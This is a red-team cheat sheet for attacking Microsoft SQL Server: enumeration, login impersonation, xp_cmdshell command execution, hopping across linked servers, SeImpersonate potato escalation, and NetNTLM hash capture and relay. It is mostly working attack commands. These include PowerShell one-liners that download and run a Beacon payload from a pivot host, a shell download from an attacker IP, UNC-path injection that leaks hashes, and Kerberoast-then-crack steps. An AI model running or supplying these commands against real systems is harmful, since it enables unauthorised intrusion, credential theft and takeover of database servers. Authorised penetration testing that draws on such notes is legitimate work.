## MS SQL Attacks

Attacking Microsoft SQL Server instances for code execution, lateral movement across linked servers, and privilege escalation.

> [!Note]
> Don't forget to check guest-level access before escalating. If the service isn't reachable from the network, try RDP or port forwarding first.

---

### Enumeration

#### CS — PowerUpSQL + SQLRecon

```sh
beacon> powershell-import C:\Tools\PowerUpSQL.ps1

# Find SQL instances
beacon> powershell Get-SQLInstanceDomain
beacon> powershell Get-SQLConnectionTest -Instance "<sql_host>,1433" | fl
beacon> powershell Get-SQLServerInfo -Instance "<sql_host>,1433"

# Chain together — test and enumerate all accessible instances
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# SQLRecon
beacon> execute-assembly C:\Tools\SQLRecon.exe -a windows -s <sql_host>,1433 -m whoami
beacon> execute-assembly C:\Tools\SQLRecon.exe -a windows -s <sql_host>,1433 -m info

# Find SQL admin groups and their members
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```

Finding SQL access when you don't have a role:
- Look for `*SQL*` domain groups → impersonate a member
- Kerberoast the SQL service account (often has `mssql_svc` SPN) → crack → `make_token`

```sh
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
# Kerberoast mssql_svc, crack, then:
beacon> make_token <DOMAIN>\mssql_svc <cracked_password>
beacon> execute-assembly C:\Tools\SQLRecon.exe -a windows -s <sql_host>,1433 -m whoami
```

#### Sliver

```sh
sqlrecon -- /enum:sqlspns
sqlrecon -- /auth:wintoken /h:<sql_host> /m:whoami
sqlrecon -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /m:whoami
sqlrecon -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /m:info
```

#### Linux (via proxychains)

```sh
proxychains mssqlclient.py -windows-auth <DOMAIN>/<user>@<sql_ip>
SQL> select @@servername;
SQL> select SYSTEM_USER;
```

---

### Impersonation

SQL login impersonation (context switching) — assume permissions of another login without knowing their password.

```sh
# Manual queries (in mssqlclient / HeidiSQL)
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;

# Check if SA can be impersonated
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sa');
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');

# CS — SQLRecon
beacon> execute-assembly C:\Tools\SQLRecon.exe -a windows -s <sql_host>,1433 -m impersonate
beacon> execute-assembly C:\Tools\SQLRecon.exe -a windows -s <sql_host>,1433 -m iwhoami -i <user_to_impersonate>

# Sliver
sqlrecon -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /m:impersonate
sqlrecon -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /m:whoami /i:<user>
```

---

### Command Execution (xp_cmdshell)

Requires sysadmin. `Invoke-SQLOSCmd` auto-enables, runs, and disables xp_cmdshell.

```sh
# Check state (0 = disabled)
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

# Enable manually
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Execute
EXEC xp_cmdshell 'whoami';

# Restore config after use
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'Show Advanced Options', 0; RECONFIGURE;
```

#### CS

```sh
# Auto-enable + run via PowerUpSQL
beacon> powershell Invoke-SQLOSCmd -Instance "<sql_host>,1433" -Command "whoami" -RawResults

# Deliver a payload (SQL server can't reach team server directly)
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon> rportfwd 8080 127.0.0.1 80
# Host smb_x64.ps1 at /b on team server
EXEC xp_cmdshell 'powershell -w hidden -c "iex (new-object net.webclient).downloadstring("""http://<pivot_host>:8080/b""")"';

# Link the delivered Beacon
beacon> link <sql_host> <pipe_name>
```

#### Sliver

```sh
sqlrecon -- /a:wintoken /h:<sql_host> /m:enablexp
sqlrecon -- /a:wintoken /h:<sql_host> /m:xpcmd /c:"whoami"

# Shell delivery
inline-execute-assembly -t 20 /path/SQLRecon.exe '/a:wintoken /h:<sql_host> /m:xpcmd /c:"powershell -enc <BASE64_PAYLOAD>"'

# One-liner with impersonation
EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -enc <BASE64_PAYLOAD>'
```

---

### Linked Servers

SQL links allow one instance to query data from another — potentially anywhere (other domains, forests, cloud).

```sh
# Discover links
SELECT srvname, srvproduct, rpcout FROM master..sysservers;

# Query linked server
SELECT * FROM OPENQUERY("<linked_server>", 'select @@servername');

# Check xp_cmdshell on linked server
SELECT * FROM OPENQUERY("<linked_server>", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');

# Enable xp_cmdshell via link (requires RPC Out = 1 on the link)
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [<linked_server>]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [<linked_server>]

# Execute via linked server (use base64 to avoid quote escaping issues)
SELECT * FROM OPENQUERY("<linked_server>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc <BASE64_PAYLOAD>''')
```

```sh
# CS — auto-crawl all links
beacon> powershell Get-SQLServerLinkCrawl -Instance "<sql_host>,1433"

# SQLRecon links
sqlrecon -t 20 -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /m:links
sqlrecon -t 20 -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /l:<linked_server> /m:info
sqlrecon -t 20 -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /l:<linked_server> /m:whoami
sqlrecon -t 20 -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /l:<linked_server> /m:checkrpc
sqlrecon -t 20 -- /auth:Local /u:<user> /p:<password> /h:<sql_host> /l:<linked_server> /m:enablexp

# Shell delivery via link
inline-execute-assembly -t 50 /path/SQLRecon.exe '/auth:Local /u:<user> /p:<password> /h:<sql_host> /l:<linked_server> /m:xpcmd /c:"powershell -enc <BASE64_PAYLOAD>"'
```

> [!Warning]
> The inclusion of a benign statement before xp_cmdshell in OPENQUERY is required for it to trigger.

---

### MSSQLand (Sliver — Best for Multi-Link)

Best tool for multi-link exploitation. Supports impersonation across link chains.

Setup as a Sliver alias:

```sh
# ~/.sliver-client/aliases/mssqland/alias.json
{
    "name": "MSSQLand",
    "version": "v1.0",
    "command_name": "mssqland",
    "original_author": "n3rada",
    "repo_url": "https://github.com/n3rada/MSSQLand",
    "help": "Navigate and conquer linked MS SQL servers",
    "entrypoint": "Main",
    "allow_args": true,
    "default_args": "/help",
    "is_reflective": false,
    "is_assembly": true,
    "files": [
      {"os": "windows", "arch": "amd64", "path": "MSSQLand.exe"},
      {"os": "windows", "arch": "386",   "path": "MSSQLand.exe"}
    ]
}
# Place MSSQLand.exe in the same folder, then restart Sliver
```

```sh
# Whoami / basic access
mssqland /c:token /h:<sql01> /a:whoami
mssqland /c:local /u:<user> /p:<password> /h:<sql01> /action:whoami

# Check impersonation on current instance
mssqland /c:token /h:<sql01> /a:impersonate

# Visualise link map
mssqland /c:local /u:<user> /p:<password> /h:<sql01> /action:linkmap
# Example output: SQL01 (user [dbo]) ---> SQL02 ---> SQL03

# Impersonate across links
mssqland /c:local /u:<user> /p:<password> /h:sql01 /l:sql02 /action:whoami
mssqland /c:local /u:<user> /p:<password> /h:sql01:impuser /l:sql02 /action:whoami

# Multi-hop: sql01 -> sql03 -> sql02
mssqland /c:local /u:<user> /p:<password> /h:sql01:impuser /l:SQL03:impuser2,SQL02:impuser3 /action:whoami

# Deliver shell
mssqland /c:token /h:sql01:impuser /l:SQL02,sql01 /a:pwshdl '<attacker_ip>/payload.txt'

# Search databases
mssqland /c:token /h:sql01:impuser /l:SQL02 /a:databases
mssqland /c:token /h:sql01:impuser /l:SQL02 /a:search wordpress
```

---

### MSSQLpwner

PTH and credential auth. Interactive mode and chain selection.

```sh
# Enumerate with credentials
mssqlpwner <domain>/<user>:<password>@<target> -windows-auth interactive enumerate
mssqlpwner ./<user>@<target> -hashes ':<hash>' -windows-auth interactive enumerate
mssqlpwner <domain>/<machine>\$@<target> -hashes ':<hash>' -windows-auth interactive enumerate

# Local auth
mssqlpwner <user>:<password>@<target> interactive enumerate

# Execute command on a specific linked server
mssqlpwner <user>:<password>@<target> -link-name SQL03 exec 'powershell -enc <BASE64_PAYLOAD>'

# Interactive chain selection
mssqlpwner -hashes ':<hash>' ./Administrator@<target> -windows-auth -link-name <link> enumerate interactive
get-chain-list
set-chain <chain_guid>
exec "whoami /all"
exec 'powershell -enc <BASE64_PAYLOAD>'
```

---

### Privilege Escalation (SeImpersonate)

MSSQL services run as `NT Service\MSSQLSERVER` which has `SeImpersonatePrivilege`. This allows escalation to SYSTEM via potato attacks.

```sh
# Verify the privilege
beacon> execute-assembly C:\Tools\Seatbelt.exe TokenPrivileges
# Look for: SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED

# Escalate with SweetPotato
beacon> execute-assembly C:\Tools\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <BASE64_PAYLOAD>"
beacon> connect localhost 4444
```

---

### Relaying to MSSQL

Capture NetNTLM hashes from SQL via UNC path injection, then crack or relay.

#### Capture (Responder / SQLRecon)

```sh
# Trigger UNC lookup from SQL server
sqlrecon -i -- /a:wintoken /h:<sql_host> /m:smb /unc:\\\\<attacker_ip>\\testpath

# Capture hash in Responder
sudo responder -I <interface>

# Crack captured NetNTLMv2
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force

# PowerUpSQL
Invoke-SQLUncPathInjection -Instance <sql_host> -Verbose -CaptureIp <attacker_ip>
```

#### Relay (ntlmrelayx)

```sh
# Relay to all hosts in a file
sudo impacket-ntlmrelayx --no-http-server -smb2support -tf hosts.txt -c 'powershell -enc <BASE64_PAYLOAD>'

# Relay to MSSQL
sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t mssql://<target_ip> -c 'powershell -enc <BASE64_PAYLOAD>'

# Also: SQLmap for web-based MSSQL injection
sqlmap -r sqli.txt --batch --sql-query="EXEC master.dbo.xp_dirtree '\\\\<attacker_ip>\\share'"
```
